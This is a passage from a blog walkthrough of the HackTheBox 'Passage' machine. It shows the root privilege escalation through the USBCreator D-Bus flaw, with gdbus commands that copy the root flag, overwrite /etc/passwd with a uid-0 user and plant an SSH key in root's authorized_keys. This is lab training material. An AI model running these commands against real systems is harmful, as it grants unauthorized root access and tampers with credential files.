-rw-r--r-- 1 root root  65 Jan 15  2019 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
</code></pre><ul><li><code>51-ubuntu-admin.conf</code> is <a href=https://en.wikipedia.org/wiki/Polkit target=_blank rel=noopener>Polkit</a> config file<ul><li>The configuration specifies that <code>sudo</code> and <code>admin</code> groups can invoke privileged processes with a password</li><li><a href=https://www.freedesktop.org/software/polkit/docs/0.105/pklocalauthority.8.html target=_blank rel=noopener>https://www.freedesktop.org/software/polkit/docs/0.105/pklocalauthority.8.html</a></li></ul></li></ul><pre tabindex=0><code>nadav@passage:~$ cat /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin
</code></pre><ul><li><code>com.ubuntu.USBCreator.conf</code></li></ul><pre tabindex=0><code>nadav@passage:~$ cat /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
&lt;!DOCTYPE busconfig PUBLIC
 &#34;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN&#34;
 &#34;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd&#34;&gt;
&lt;busconfig&gt;

  &lt;!-- Only root can own the service --&gt;
  &lt;policy user=&#34;root&#34;&gt;
    &lt;allow own=&#34;com.ubuntu.USBCreator&#34;/&gt;
  &lt;/policy&gt;

  &lt;!-- Allow anyone to invoke methods (further constrained by
       PolicyKit privileges --&gt;
  &lt;policy context=&#34;default&#34;&gt;
    &lt;allow send_destination=&#34;com.ubuntu.USBCreator&#34; 
           send_interface=&#34;com.ubuntu.USBCreator&#34;/&gt;
    &lt;allow send_destination=&#34;com.ubuntu.USBCreator&#34; 
           send_interface=&#34;org.freedesktop.DBus.Introspectable&#34;/&gt;
    &lt;allow send_destination=&#34;com.ubuntu.USBCreator&#34; 
           send_interface=&#34;org.freedesktop.DBus.Properties&#34;/&gt;
  &lt;/policy&gt;

&lt;/busconfig&gt;
</code></pre><ul><li>There is a <a href=https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/ target=_blank rel=noopener>blog</a><ul><li>It exploits <a href=https://www.freedesktop.org/wiki/Software/dbus/ target=_blank rel=noopener>D-Bus</a></li><li>Summary</li></ul></li></ul><pre tabindex=0><code>A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the sudoer group to bypass the password security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root - without supplying a password. This trivially leads to elevated privileges, for instance, by overwriting the shadow file and setting a password for root.
</code></pre><ul><li>We can copy a <code>root</code> flag<ul><li>We have to copy a file to a file that doesn&rsquo;t exist</li></ul></li></ul><pre tabindex=0><code></code></pre><p>nadav@passage:/dev/shm$ ls -lha
total 168K
drwxrwxrwt 2 root root 160 Nov 1 10:21 .
drwxr-xr-x 18 root root 3.8K Oct 31 11:24 ..
-rwx&mdash;&mdash; 1 nadav nadav 65M Oct 31 11:24 pulse-shm-1636705118
-rwx&mdash;&mdash; 1 nadav nadav 65M Oct 31 11:24 pulse-shm-3691360381
-rwx&mdash;&mdash; 1 nadav nadav 65M Oct 31 11:24 pulse-shm-3862711046
-rwx&mdash;&mdash; 1 nadav nadav 65M Oct 31 11:24 pulse-shm-3905698949
-rwx&mdash;&mdash; 1 nadav nadav 65M Oct 31 11:24 pulse-shm-664920523</p><pre tabindex=0><code></code></pre><pre tabindex=0><code>nadav@passage:/dev/shm$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /dev/shm/flag.txt true
()
</code></pre><pre tabindex=0><code>nadav@passage:/dev/shm$ ls -lha
total 168K
drwxrwxrwt  2 root  root   160 Nov  1 10:21 .
drwxr-xr-x 18 root  root  3.8K Oct 31 11:24 ..
-rw-r--r--  1 root  root    33 Nov  1 10:21 flag.txt
-rwx------  1 nadav nadav  65M Oct 31 11:24 pulse-shm-1636705118
-rwx------  1 nadav nadav  65M Oct 31 11:24 pulse-shm-3691360381
-rwx------  1 nadav nadav  65M Oct 31 11:24 pulse-shm-3862711046
-rwx------  1 nadav nadav  65M Oct 31 11:24 pulse-shm-3905698949
-rwx------  1 nadav nadav  65M Oct 31 11:24 pulse-shm-664920523
</code></pre><ul><li>To get a shell we can overwrite <code>/etc/passwd</code>, add our public key to <code>authorized_keys</code> and so on</li></ul><pre tabindex=0><code>nadav@passage:/dev/shm$ cp /etc/passwd passwd
nadav@passage:/dev/shm$ openssl passwd -1 pentest
$1$ApmuYR5C$85SftWXmqXbDoZLqhrmD71
nadav@passage:/dev/shm$ echo &#39;pentest:$1$ApmuYR5C$85SftWXmqXbDoZLqhrmD71:0:0:pentest:/root:/bin/bash&#39; &gt;&gt; passwd 
nadav@passage:/dev/shm$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /dev/shm/passwd /etc/passwd true
()
nadav@passage:/dev/shm$ tail -2 /etc/passwd
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
pentest:$1$ApmuYR5C$85SftWXmqXbDoZLqhrmD71:0:0:pentest:/root:/bin/bash
nadav@passage:/dev/shm$ su - pentest
Password: 
root@passage:~# 
</code></pre><pre tabindex=0><code>nadav@passage:/dev/shm$ echo &#34;ssh-rsa AAAAB3&lt;SNIP&gt; kali@kali&#34; &gt; authorized_keys
nadav@passage:/dev/shm$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /dev/shm/authorized_keys /root/.ssh/authorized_keys true
()
</code></pre><pre tabindex=0><code>└─$ ssh root@10.10.10.206                                                   
Warning: Permanently added &#39;10.10.10.206&#39; (ED25519) to the list of known hosts.
Last login: Mon Aug 31 15:14:22 2020 from 127.0.0.1
root@passage:~# 
</code></pre></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
<a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fpassage%2f&text=%5bHTB%5d%20Machine%3a%20Passage&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i>
</a><a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fpassage%2f&title=%5bHTB%5d%20Machine%3a%20Passage" target=_blank><i class="fab fa-reddit"></i>
</a><a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fpassage%2f&title=%5bHTB%5d%20Machine%3a%20Passage" target=_blank><i class="fab fa-linkedin"></i>
</a><a class="btn btn-sm email-btn" href="mailto:?subject=%5bHTB%5d%20Machine%3a%20Passage&body=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fpassage%2f" target=_blank><i class="fas fa-envelope-open-text"></i></a></div><div class="col-md-6 btn-improve-page"><a href=https://github.com/umarbaevB/umarbaevb.github.io/edit/main/content/posts/cybersecurity/hackthebox/machines/linux/passage/index.md title="Improve this page" target=_blank rel=noopener><i class="fas fa-code-branch"></i>
Improve this page</a></div></div><hr><div class="row next-prev-navigator"><div class="col-md-6 previous-article"><a href=/posts/cybersecurity/hackthebox/machines/linux/paper/ title="[HTB] Machine: Paper" class="btn btn-outline-info"><div><i class="fas fa-chevron-circle-left"></i> Prev</div><div class=next-prev-text>[HTB] Machine: Paper</div></a></div><div class="col-md-6 next-article"><a href=/posts/cybersecurity/hackthebox/machines/linux/pc/ title="[HTB] Machine: PC" class="btn btn-outline-info"><div>Next <i class="fas fa-chevron-circle-right"></i></div><div class=next-prev-text>[HTB] Machine: PC</div></a></div></div><hr></div></div></div><a id=scroll-to-top class=btn><i class="fas fa-chevron-circle-up"></i></a></section><section class=toc-section id=toc-section><div class=toc-holder><h5 class="text-center pl-3">Table of Contents</h5><hr><div class=toc><nav id=TableOfContents><ul><li><a href=#enumeration>Enumeration</a></li><li><a href=#user-1>User #1</a></li><li><a href=#user-2>User #2</a></li><li><a href=#root>Root</a></li></ul></nav></div></div></section></div><footer id=footer class="container-fluid text-center align-content-center footer pb-2"><div class="container pt-5"><div class="row text-left"><div class="col-md-4 col-sm-12"><h5>Navigation</h5><ul><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io/#about>About</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io/#skills>Skills</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io/#education>Education</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io/#projects>Projects</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io/#achievements>Courses and Events</a></li></ul></div><div class="col-md-4 col-sm-12"><h5>Contact me:</h5><ul><li><a href=mailto:hrafnulf13@gmail.com target=_blank rel=noopener><span><i class="fas fa-envelope"></i></span> <span>hrafnulf13@gmail.com</span></a></li><li><a href=https://github.com/umarbaevB target=_blank rel=noopener><span><i class="fab fa-github"></i></span> <span>umarbaevB</span></a></li></ul></div></div></div><hr><div class=container><p id=disclaimer><strong>Liability Notice:</strong> This theme is under MIT license. So, you can use it for non-commercial, commercial, or private uses. You can modify or distribute the theme without requiring any permission from the theme author. However, the theme author does not provide any warranty or takes any liability for any issue with the theme.</p></div><hr><div class=container><div class="row text-left"><div class=col-md-4><a id=theme href=https://github.com/hugo-toha/toha target=_blank rel=noopener><img src=/images/theme-logo_hu8376fd15465fef26ffe66b6bcf0ca686_13669_32x0_resize_box_3.png alt="Toha Theme Logo">
Toha</a></div><div class="col-md-4 text-center">© 2020 Copyright.</div><div class="col-md-4 text-right"><a id=hugo href=https://gohugo.io/ target=_blank rel=noopener>Powered by
<img src=/images/hugo-logo.svg alt="Hugo Logo" height=18></a></div></div></div></footer><script src=/application.1f9ecfc54b730529ffdf2e314da715a7d9bae90419d14f6eee294a84b6f1247a.js integrity="sha256-H57PxUtzBSn/3y4xTacVp9m66QQZ0U9u7ilKhLbxJHo=" defer></script></body></html>